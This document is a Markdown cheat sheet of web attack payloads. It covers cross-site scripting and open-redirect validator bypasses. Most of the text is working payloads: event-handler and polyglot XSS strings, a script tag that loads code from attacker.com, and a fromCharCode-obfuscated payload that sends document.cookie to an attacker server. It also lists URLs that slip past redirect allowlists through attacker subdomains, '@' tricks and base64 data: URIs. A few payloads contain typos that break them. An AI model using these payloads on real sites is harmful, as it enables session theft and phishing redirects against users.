
## XSS

```js
<img onload=alert('The image has been loaded!') src="example.png">
```


```js
\"-alert(1)}// 
```

`This payload loads JavaScript code within an iframe. It’s useful when <script> tags are banned by the XSS filter:`
```js
<iframe src=javascript:alert(1)>
```



`This payload is useful when your input string can’t contain the term script. It inserts an HTML element that will run JavaScript automatically after it’s loaded:`
```js
<body onload=alert(1)>
```




 `It then injects an <img>tag with an invalid source URL. Once the tag fails to load, it will run the JavaScript specified in the onerror attribute:`
```js
<img src=x onerror=prompt(1);>
```




`<!- is the start of an HTML comment. This payload will comment out the rest of the line in the HTML document to prevent syntax errors:`
```js
<script>alert(1)<!–
```




`This payload inserts a link that will cause JavaScript to execute after a user hovers over the link with their cursor:`
```js
<a onmouseover"alert(1)">test</a>
```



`To run external script on attacker's server:`
```js
<script src=//attacker.com/test.js>
```



You can use these to embed JavaScript code into URLs. Example, `https://example.com/upload_profile_pic?url=IMAGE_URL` like this:
```js
<img src="payload"/>
```


`Payloads:`
```js
javascript:alert('You are hacked!!')
```

```js
data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTIGJ5IFZpY2tpZScpPC9zY3JpcHQ+"
```



`xss polyglot payload:`
```js
javascript:"/*\"/*`/*' /*</template>
</textarea></noembed></noscript></title>
</style></script>-->&lt;svg onload=/*<html/*/onmouseover=alert()//>
```
`This is a type of XSS payload that executes in multiple contexts. For example, it will executeCross-Site Scripting regardless of whether it is inserted into an <img> tag, a <script> tag, or a generic <p> tag and can bypass some XSS filters.`



`If the application filters special HTML characters, like single and double quotes, you can’t write any strings into your XSS payload directly. But you could try using the JavaScript fromCharCode() function, which maps numeric codes to the corresponding ASCII characters, to create the string you need.` 

`For example, this piece of code is equivalent to the string "http://attacker_server_ip/?c=":`

```js
String.fromCharCode(104, 116, 116, 112, 58, 47, 47, 97, 116, 116, 97, 99, 107,101, 114, 95, 115, 101, 114, 118, 101, 114, 95, 105, 112, 47, 63, 99, 61)
```



This means you can construct an XSS payload without quotes, like this:

```js
<scrIPT>location=String.fromCharCode(104, 116, 116, 112, 58, 47, 47, 97, 116, 116, 97, 99, 107, 101, 114, 95, 115, 101, 114, 118,101, 114, 95, 105, 112, 47, 63, 99, 61)+document.cookie;</scrIPT>
```

The String.fromCharCode() function returns a string, given an input list of ASCII character codes. 

Use ascii character mapper tool for this: `https://github.com/ashique-thaha/ascii-character-mapper.git` 

## open redirects


`We can bypass the protection by creating a subdomain or directory with the target’s domain name:`
```
https://example.com/login?redir=http://example.com.attacker.com
https://example.com/login?redir=http://attacker.com/example.com
```



`To prevent attacks like these from succeeding, the validator might accept only URLs that both start and end with a domain listed on the allowlist. it’s possible to construct a URL that satisfies both of these rules. Take a look at this one:`
```
https://example.com/login?redir=https://example.com.attacker.com/example.com
```



`Or you could use the at symbol (@) to make the first example.com the username portion of the URL:`
```
https://example.com/login?redir=https://example.com@attacker.com/example.com
```



`use the data: scheme to embed small files in a URL. They are constructed in this format:`
```
data:MEDIA_TYPE[;base64],DATA
```


`For example, you can send a plaintext message with the data scheme like this:`
```
data:text/plain,hello!
```


`The optional base64 specification allows  to send base64-encoded messages. For example, this is the base64-encoded version of the preceding message:`
```
data:text/plain;base64,aGVsbG8h
```



`We can use the data: scheme to construct a base64-encoded redirect URL that evades the validator. For example, this URL will redirect to example.com:`
```
data:text/html;base64,PHNjcmlwdD5sb2NhdGlvbj0iaHR0cHM6Ly9leGFtcGxlLmNvbSI8L3NjcmlwdD4=
```


The data encoded in this URL, `PHNjcmlwdD5sb2NhdGlvbj0iaHR0cHM6Ly9leGFtcGxlLmNvbSI8L3NjcmlwdD4=`, is the base64-encoded version of this script:
```js
<script>location="https://example.com"</script>
```


`You can insert this data URL into the redirection parameter to bypass blocklists:`
```
https://example.com/login?redir=data:text/html;base64,PHNjcmlwdD5sb2NhdGlvbj0iaHR0cHM6Ly9leGFtcGxlLmNvbSI8L3NjcmlwdD4=
```